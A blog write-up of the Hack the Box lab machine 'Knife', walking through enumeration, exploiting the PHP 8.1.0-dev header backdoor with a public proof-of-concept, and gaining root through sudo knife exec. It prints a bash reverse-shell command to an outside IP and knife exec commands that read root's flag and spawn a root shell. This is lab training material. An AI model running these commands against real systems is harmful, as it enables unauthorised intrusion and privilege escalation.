+++
author = "Nick"
categories = ["hack the box", "Linux", "easy", "php backdoor", "php 8.1.0-dev", "knife"]
date = 2021-08-28T16:35:39Z
description = ""
draft = false
thumbnail = "/images/2021/08/knife.png"
slug = "hack-the-box-knife"
summary = "Welcome back! Today we are doing the Hack the Box machine - Knife. This is listed as an easy Linux machine. Let's start!\n"
tags = ["hack the box", "Linux", "easy", "php backdoor", "php 8.1.0-dev", "knife"]
title = "Hack the Box - Knife"
url = "/hack-the-box-knife"

+++


Welcome back! Today we are doing the Hack the Box machine - Knife. This is listed as an easy Linux machine. Let's start!

As usual, we start with `nmap`:

```
Nmap scan report for 10.10.10.242
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When we view what's being hosted on port 80 we are brough to a hospital hosting site. There isn't anything notable on the site that we can access. We'll start by enumerating with `ffuf`.

Command:
`ffuf -u http://10.10.10.242/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50 -fs 277`

In this case we use the `-fs` to hide responses with a size of 277 because of the amount of false positives. There is nothing additional. So we move on to using `Burpsuite`. When we load up `Burpsuite` and view our request / response, we see a hint:

![](/images/2021/08/image.png)

The `X-Powered-By` Header value. The first google results gives us [this](https://packetstormsecurity.com/files/162864/PHP-8.1.0-dev-Backdoor-Remote-Command-Execution.html). They were so kind to even give us a PoC script. We download the PoC and execute it:

Command:
`python3 exploit.py -l http://10.10.10.242`

When we run it, we get an interactive shell back.

![](/images/2021/08/image-1.png)

We use `which nc` to identify if `netcat` is on the system.

![](/images/2021/08/image-2.png)

We attempt to use `netcat` to create a shell back, but it doesn't work.

![](/images/2021/08/image-3.png)

So instead of `netcat` we'll try to catch a shell with a `bash` command.

Command:
`bash -i >& /dev/tcp/10.10.14.68/6969 0>&1`

That didn't work either. So, there is a space on this PoC for proxy interface. We'll simply uncomment it and let the requests go through `Burpsuite` so we can see what's being sent.

![](/images/2021/08/image-4.png)

Now with our requests coming through Burp, we can see what's being sent. In actuallity its just a simple header value - `User-Agentt` is the value we can modify to obtain the backdoor.

![](/images/2021/08/image-5.png)

We modify the request as it comes through to send us a shell to a `netcat` listener on port 6969

![](/images/2021/08/image-6.png)

Next we check to see what we can run as `root` with `sudo -l`

![](/images/2021/08/image-7.png)

We see that we can run an app called `knife`. Some googling finds us the [documentation](https://docs.chef.io/workstation/knife_exec/). There's a section for `exec`. This function lets us execute codes through itself. After some trial and error, we were able to craft a command to get the root flag.

Command:
`sudo /usr/bin/knife exec -E "exec 'cat /root/root.txt'"`

Now you could also call an interactive `bash` shell and work that way

Command:
`sudo /usr/bin/knife exec -E "exec '/bin/bash -i'"`

Either way gets us our `root.txt` flag! This was a very fast and simple box. The hardest part was understanding the `exec` pattern in the `Knife` command.



